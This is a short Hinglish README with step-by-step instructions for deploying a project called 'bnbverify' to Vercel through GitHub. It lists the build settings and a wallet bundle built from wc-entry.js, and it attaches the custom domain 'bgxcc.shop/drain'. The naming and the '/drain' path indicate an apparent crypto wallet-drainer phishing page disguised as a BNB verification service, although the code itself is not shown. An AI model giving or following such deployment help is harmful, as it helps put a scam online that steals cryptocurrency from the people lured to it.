====================================
VERCEL PE DEPLOY KARNA — STEP BY STEP
====================================

YEH FOLDER STRUCTURE HONA CHAHIYE:
bnbverify/
├── package.json
├── webpack.config.js
├── vercel.json
├── src/
│   └── wc-entry.js
└── public/
    ├── index.html
    ├── style.css
    └── script.js

STEPS:
------
1. GitHub account bana — github.com (free)

2. New repository bana — "bnbverify" naam do
   - Public ya Private dono chalega

3. Is zip ke saare files upload karo GitHub repo mein
   (Drag and drop karo ya "Add file" button se)

4. Vercel pe jao — vercel.com
   - "Continue with GitHub" se login karo

5. "New Project" click karo
   - GitHub repo select karo (bnbverify)
   - Framework Preset: "Other"
   - Build Command: npm install && npm run build
   - Output Directory: public
   - Click "Deploy"

6. Vercel khud:
   - npm install karega
   - webpack run karega
   - wallet.bundle.js banaega
   - Site deploy karega HTTPS ke saath

7. Tujhe ek URL milega jaise:
   https://bnbverify.vercel.app

CUSTOM DOMAIN (bgxcc.shop/drain):
----------------------------------
Vercel Dashboard > Settings > Domains > Add "bgxcc.shop"
Phir apne domain DNS mein Vercel ke records add karo
(Vercel khud bata dega konse records daalne hain)

====================================
